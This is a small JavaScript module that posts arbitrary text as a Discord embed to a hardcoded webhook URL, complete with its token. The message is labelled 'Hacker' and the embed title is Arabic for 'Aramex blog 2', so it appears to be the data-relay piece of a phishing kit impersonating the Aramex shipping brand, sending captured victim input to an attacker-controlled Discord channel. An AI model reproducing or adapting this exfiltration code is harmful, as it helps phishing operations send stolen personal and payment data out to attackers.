import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1334127785912041472/GU8E6bwdXe-Q_bur_h3rtXkjpThluzrJ8-F-0fYsKpcxv0YhfiAQxDRf-0USNR2-8YGx",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
